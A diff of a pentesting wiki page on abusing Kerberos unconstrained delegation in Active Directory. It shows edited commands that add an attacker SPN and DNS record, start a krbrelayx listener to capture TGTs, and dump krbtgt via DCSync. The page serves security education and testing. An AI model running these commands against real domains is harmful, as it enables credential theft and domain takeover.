@@ -22,7 +22,7 @@ Some of the following parts allow to obtain modified or crafted Kerberos tickets
 
 ### Unconstrained Delegations
 
-If a computer, with unconstrained delegations privileges, is compromised, an attacker must wait for a privileged user to authenticate on it \(or [force it](../mitm-and-coerced-authentications/)\) using Kerberos. The attacker service will receive a ST containing the user's TGT. That TGT will be used by the service as a proof of identity to obtain access to a target service as the target user.
+If an account \(user or computer\), with unconstrained delegations privileges, is compromised, an attacker must wait for a privileged user to authenticate on it \(or [force it](../mitm-and-coerced-authentications/)\) using Kerberos. The attacker service will receive a ST \(service ticket\) containing the user's TGT. That TGT will be used by the service as a proof of identity to obtain access to a target service as the target user.
 
 {% hint style="info" %}
 Unconstrained delegation abuses are usually combined with the [PrinterBug](../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug) or [PrivExchange](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to gain domain admin privileges.
@@ -30,24 +30,26 @@ Unconstrained delegation abuses are usually combined with the [PrinterBug](../mi
 
 {% tabs %}
 {% tab title="From the attacker machine \(UNIX-like\)" %}
-In order to abuse the unconstrained delegations privileges of a computer account, an attacker must add his machine to the SPNs of the compromised account and add a DNS entry for it.
+In order to abuse the unconstrained delegations privileges of an account, an attacker must add his machine to its SPNs \(i.e. of the compromised account\) and add a DNS entry for that name.
 
-This allows targets \(like Domain Controllers and Exchange servers\) to authenticate back to the attacker machine.
+This allows targets \(e.g. Domain Controllers or Exchange servers\) to authenticate back to the attacker machine.
 
 This can be done with [addspn](https://github.com/dirkjanm/krbrelayx), [dnstool](https://github.com/dirkjanm/krbrelayx) and [krbrelayx](https://github.com/dirkjanm/krbrelayx) \(Python\).
 
 ```bash
-# Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
-addspn.py -u 'DOMAIN\MachineAccont$' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'
+# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
+addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'
 
-# Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
-dnstool.py -u 'DOMAIN\MachineAccont$' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'
+# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
+dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'
 
-# Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
-krbrelayx.py -aesKey 'MachineAccount_AES_key'
+# 3. Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
+krbrelayx.py -aesKey 'CompromisedAccont_AES_key'
+
+# 4. Authentication coercion
 ```
 
-Once the krbrelayx listener is ready, a [forced authentication attack](../mitm-and-coerced-authentications/) \(e.g. [PrinterBug](../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange)\) can be operated. The listener will then receive an authentication, hence a ST, containing a TGT.
+Once the krbrelayx listener is ready, an [authentication coercion attack](../mitm-and-coerced-authentications/) \(e.g. [PrinterBug](../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange)\) can be operated. The listener will then receive a Kerberos authentication, hence a ST, containing a TGT.
 {% endtab %}
 
 {% tab title="From the compromised computer \(Windows\)" %}
@@ -70,8 +72,6 @@ lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
 ```
 {% endtab %}
 {% endtabs %}
-
-There is also another attack based on unconstrained delegations, the [MachineAccontQuota](../domain-settings/machineaccountquota.md) domain-level attribute and the `SeEnableDelegationPrivilege` user right.
 
 ### Constrained Delegations
 
